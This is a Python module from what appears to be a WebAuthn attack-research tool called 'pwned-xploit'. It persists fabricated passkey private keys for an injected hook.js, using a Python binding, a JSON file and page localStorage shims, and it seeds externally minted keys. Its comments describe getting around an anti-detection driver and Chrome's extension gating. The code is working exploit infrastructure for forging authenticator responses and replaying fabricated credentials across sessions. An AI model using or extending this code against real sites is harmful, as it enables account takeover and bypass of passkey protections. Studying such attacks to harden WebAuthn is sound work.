"""Persistence backend for the INJECTED pwned-xploit hook (no extension).

hook.js persists fabricated keys over a postMessage protocol that the extension's
bridge.js + background.js normally answer with chrome.storage. When we inject
hook.js via add_init_script (no extension), that storage is gone — so registration
saves no private key, and later authentication (get()) has nothing to sign with
("storage bridge unavailable (bridge timeout)" → get.failed).

This restores the backend without the extension: a MAIN-world shim (BRIDGE_SHIM_JS)
answers hook.js's messages by calling an exposed binding, which reads/writes the
fabricated keys to data/fab_keys.json. A key registered in one run can therefore
authenticate in a later run. `_store` mirrors pwned-xploit/background.js's actions.
"""
from __future__ import annotations

import json
from pathlib import Path

FAB_KEYS_FILE = Path("data/fab_keys.json")

# MAIN-world drop-in for the extension's bridge.js: relay hook.js storage messages
# to the exposed Python binding and post the response back on the same protocol.
BRIDGE_SHIM_JS = r"""
(() => {
  if (window.__webauthnBridgeShim) return; window.__webauthnBridgeShim = true;
  window.addEventListener("message", async (event) => {
    if (event.source !== window) return;
    if (event.data?.channel !== "webauthn-research") return;
    const { id, action, rpId, record } = event.data;
    let response;
    try {
      response = await window.__webauthnStore(action, rpId ?? null, record ?? null);
    } catch (err) {
      response = { ok: false, error: String(err) };
    }
    window.postMessage({ channel: "webauthn-research-response", id, response }, "*");
  });
})();
"""

_observer_logs: dict = {}   # per-process (one run); logs need not persist across runs


def _load_keys() -> dict:
    if FAB_KEYS_FILE.is_file():
        try:
            return json.loads(FAB_KEYS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}


def _save_keys(keys: dict) -> None:
    FAB_KEYS_FILE.parent.mkdir(parents=True, exist_ok=True)
    FAB_KEYS_FILE.write_text(json.dumps(keys), encoding="utf-8")


def _store(source, action, rp_id=None, record=None):
    """Answer hook.js storage messages; mirrors pwned-xploit/background.js."""
    keys = _load_keys()
    if action == "save":                       # record = {rpId, privateKeyJwk, credId…}
        keys[rp_id] = record
        _save_keys(keys)
        return {"ok": True}
    if action == "loadAll":
        return {"ok": True, "keys": keys}
    if action == "clearAll":
        _save_keys({})
        return {"ok": True}
    if action == "delete":                      # control 3: re-register a revoked key
        existed = rp_id in keys
        keys.pop(rp_id, None)
        _save_keys(keys)
        return {"ok": True, "existed": existed}
    if action == "dump":
        return {"ok": True, "keys": [
            {"rpId": rp, "credId": r.get("credIdBase64"),
             "createdAt": r.get("createdAt"), "hasPrivateKey": bool(r.get("privateKeyJwk"))}
            for rp, r in keys.items()]}
    if action == "logSave":
        if record and record.get("installId"):
            _observer_logs[record["installId"]] = record
        return {"ok": True}
    if action == "logLoadAll":
        return {"ok": True, "logs": _observer_logs}
    if action == "logClear":
        _observer_logs.clear()
        return {"ok": True}
    return {"ok": False, "error": f"unknown action: {action}"}


async def inject_hook(ctx, hook_path: str) -> None:
    """Wire persistence binding + bridge shim + hook.js into a context (real Chrome,
    no extension). Call once, before any RP navigation.

    NOTE: relies on Playwright `expose_binding`, which the anti-detection driver
    (patchright) HIDES — so under patchright window.__webauthnStore is absent and
    keyCache loading fails. Prefer inject_hook_standalone() for the injected path."""
    await ctx.expose_binding("__webauthnStore", _store)
    await ctx.add_init_script(BRIDGE_SHIM_JS)
    await ctx.add_init_script(Path(hook_path).read_text(encoding="utf-8"))


# MAIN-world bridge that needs NO Playwright binding: it answers hook.js's storage
# protocol from the page's own localStorage. localStorage is per-origin and survives
# navigation, so a key fabricated by create() is still there for a later get() after a
# sign-out/sign-in on the same origin. This sidesteps both patchright's binding-hiding
# and Chrome's command-line --load-extension gating (no Windows Hello, no extension).
_LOCALSTORAGE_BRIDGE_JS = r"""
(() => {
  if (window.__webauthnBridgeShim) return; window.__webauthnBridgeShim = true;
  const LS = "__fabkeys";
  const load = () => { try { return JSON.parse(localStorage.getItem(LS) || "{}"); } catch (e) { return {}; } };
  const save = (k) => { try { localStorage.setItem(LS, JSON.stringify(k)); } catch (e) {} };
  window.addEventListener("message", (event) => {
    if (event.source !== window) return;
    const d = event.data || {};
    if (d.channel !== "webauthn-research") return;
    const { id, action, rpId, record } = d;
    let keys = load(); let response;
    if (action === "save") { if (rpId) keys[rpId] = record; save(keys); response = { ok: true }; }
    else if (action === "loadAll") { response = { ok: true, keys }; }
    else if (action === "delete") { const e = rpId in keys; delete keys[rpId]; save(keys); response = { ok: true, existed: e }; }
    else if (action === "clearAll") { save({}); response = { ok: true }; }
    else if (action === "dump") { response = { ok: true, keys: Object.keys(keys).map(r => ({ rpId: r })) }; }
    else { response = { ok: true }; }
    window.postMessage({ channel: "webauthn-research-response", id, response }, "*");
  });
})();
"""


async def inject_hook_standalone(ctx, hook_path: str, seed_keys: dict | None = None) -> None:
    """Inject a self-contained (localStorage-backed) bridge + hook.js into a context.

    No expose_binding (so patchright can't hide it) and no extension (so Chrome's
    --load-extension gating is irrelevant). `seed_keys` (e.g. a key minted over HTTP)
    is written into the page's localStorage on load if not already present, so the
    injected hook can authenticate with it. Call once, before any RP navigation."""
    seed_js = ""
    if seed_keys:
        seed_js = (
            "(() => { try {"
            "  const LS = '__fabkeys';"
            "  const k = JSON.parse(localStorage.getItem(LS) || '{}');"
            "  const s = " + json.dumps(seed_keys) + ";"
            "  for (const r in s) { if (!(r in k)) k[r] = s[r]; }"
            "  localStorage.setItem(LS, JSON.stringify(k));"
            "} catch (e) {} })();"
        )
    await ctx.add_init_script(seed_js + _LOCALSTORAGE_BRIDGE_JS)
    await ctx.add_init_script(Path(hook_path).read_text(encoding="utf-8"))
